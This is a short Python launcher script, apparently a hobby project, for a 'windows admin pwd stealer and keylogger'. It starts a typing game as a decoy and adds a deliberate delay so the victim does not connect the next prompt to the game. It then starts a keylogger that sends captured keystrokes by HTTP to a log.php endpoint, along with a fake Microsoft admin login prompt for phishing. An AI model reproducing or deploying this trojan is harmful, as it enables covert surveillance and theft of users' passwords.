"""
python3
    samuel ovadya
project python:
    windows admin pwd stealer and keylogger (autoruns not implemented)
"""

import typing_game
import keylogger as attack
import time
typing_game.start()
#to avoid user thinking the prompt is linked to the game time should be longer
time.sleep(5)

# For other options go to keylogger.py
# By default it is sending the file to url ( via http request ) script for server in log.php
# define in URL constant in keylogger.py

#start the keylogger
#starts the windows phishing admin prompt in the kelogger
attack.defaul_start(url="http://localhost/key/log.php",phishing_path="microsoftAuth.py")


